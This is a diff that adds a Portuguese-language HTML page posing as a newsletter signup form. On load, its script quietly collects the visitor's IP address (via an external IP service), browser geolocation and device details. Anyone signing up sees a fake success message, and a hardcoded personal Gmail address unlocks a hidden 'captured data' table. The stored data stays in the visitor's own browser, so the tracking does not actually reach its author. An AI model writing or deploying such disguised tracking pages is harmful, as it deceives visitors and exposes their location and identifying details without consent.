@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<title>cadastro</title>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<style>
+  html,body{margin:0;height:100%;background:#fff;font-family:Arial,Helvetica,sans-serif}
+  #tela1{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%}
+  #tela1 input[type=email]{padding:10px 15px;font-size:16px;width:260px;margin-bottom:12px;border:1px solid #ccc;border-radius:4px}
+  #tela1 button{padding:10px 28px;font-size:16px;background:#111;color:#fff;border:none;border-radius:4px;cursor:pointer}
+  #tela2,#tela3{display:none;text-align:center;padding:40px 20px}
+  table{border-collapse:collapse;width:90%;margin:20px auto;font-size:12px}td,th{border:1px solid #ddd;padding:6px}
+</style>
+</head>
+<body>
+
+<!-- TELA 1: pede e-mail -->
+<div id="tela1">
+  <input id="mail" type="email" placeholder="Seu e-mail"/>
+  <button onclick="entrar()">Cadastrar-se</button>
+</div>
+
+<!-- TELA 2: mensagem de sucesso (qualquer e-mail) -->
+<div id="tela2">
+  <h2>Cadastro realizado!</h2>
+  <p>Em breve você receberá novidades.</p>
+</div>
+
+<!-- TELA 3: área secreta (só e-mail certo) -->
+<div id="tela3">
+  <h2>Dados capturados</h2>
+  <table id="tab">
+    <thead>
+      <tr><th>Horário</th><th>IP</th><th>SSID</th><th>Device</th><th>Lat</th><th>Lon</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+</div>
+
+<script>
+/* ---------- banco de dados em memória ---------- */
+const db = [];
+
+/* ---------- função única para coletar tudo ---------- */
+function coletaDados(){
+  const obj = {hora: new Date().toLocaleString("pt-BR")};
+
+  /* IP */
+  fetch("https://api.ipify.org?format=json")
+    .then(r=>r.json()).then(d=>{ obj.ip = d.ip; finaliza(); })
+    .catch(()=>{ obj.ip = "erro"; finaliza(); });
+
+  /* Geolocalização */
+  navigator.geolocation.getCurrentPosition(
+    p=>{ obj.lat = p.coords.latitude.toFixed(6); obj.lon = p.coords.longitude.toFixed(6); finaliza(); },
+    ()=>{ obj.lat = "erro"; obj.lon = "erro"; finaliza(); }
+  );
+
+  /* SSID (placeholder) */
+  obj.ssid = (navigator.connection && navigator.connection.type==="wifi") ? "<wifi>" : "<indisponível>";
+
+  /* Device */
+  obj.device = navigator.userAgentData?.brands?.map(b=>b.brand).join(", ") || navigator.userAgent;
+
+  function finaliza(){
+    if(obj.hasOwnProperty("ip") && obj.hasOwnProperty("lat")){
+      db.push(obj);
+    }
+  }
+}
+
+/* ---------- assim que a página carregar, já captura ---------- */
+coletaDados();
+
+/* ---------- lógica do botão ---------- */
+function entrar(){
+  const email = document.getElementById("mail").value.trim().toLowerCase();
+  document.getElementById("tela1").style.display = "none";
+
+  if(email === "hlpedrodracozinho555@gmail.com"){
+    /* mostra tabela */
+    const tb = document.querySelector("#tab tbody");
+    tb.innerHTML = "";
+    db.forEach(r=>{
+      tb.insertAdjacentHTML("beforeend",
+        `<tr><td>${r.hora}</td><td>${r.ip}</td><td>${r.ssid}</td><td>${r.device}</td><td>${r.lat}</td><td>${r.lon}</td></tr>`);
+    });
+    document.getElementById("tela3").style.display = "block";
+  }else{
+    /* só mensagem de sucesso */
+    document.getElementById("tela2").style.display = "block";
+  }
+}
+</script>
+</body>
+</html>
